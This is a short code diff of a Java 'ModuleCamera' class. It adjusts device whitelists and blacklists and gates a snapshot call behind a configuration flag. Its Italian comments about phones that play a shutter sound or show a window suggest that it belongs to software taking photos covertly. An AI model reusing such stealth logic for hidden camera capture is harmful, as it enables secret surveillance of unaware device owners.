@@ -44,7 +44,8 @@ public class ModuleCamera extends BaseInstantModule {
 	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$
 
 	// Motorola XT910 (suono), Samsung Next (suono), HTC Explorer A310e (suono)
-	//String[] blackList = new String[] { "XT910", "GT-S5570", "HTC Explorer A310e" };
+	// String[] blackList = new String[] { "XT910", "GT-S5570",
+	// "HTC Explorer A310e", "Nexus One", "GT-I9100" };
 
 	// g_1=LT18i
 	// g_2=GT-I9300
@@ -55,8 +56,10 @@ public class ModuleCamera extends BaseInstantModule {
 	// Sony XPERIA, Samsung S3, Samsung S2, Nexus, HTC Desire Z
 	// String[] whiteList=new String[]{"LT18i", "GT-I9300", "GT-I9100",
 	// "Galaxy Nexus", "HTC Vision" };
+	// tolto Messages.getString("g_3"), funziona solo se os>4, ma si vede
+	// comunque una finestra
 	String[] whiteList = new String[] { Messages.getString("g_1"), Messages.getString("g_2"),
-			Messages.getString("g_3"), Messages.getString("g_4"), Messages.getString("g_5"), };
+			Messages.getString("g_4"), Messages.getString("g_5") };
 
 	/*
 	 * (non-Javadoc)
@@ -98,11 +101,13 @@ public class ModuleCamera extends BaseInstantModule {
 
 	@Override
 	public void actualStart() {
-		try {
-			snapshot();
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (actualStart) Error: " + e);
+		if (Cfg.CAMERA) {
+			try {
+				snapshot();
+			} catch (IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart) Error: " + e);
+				}
 			}
 		}
 	}
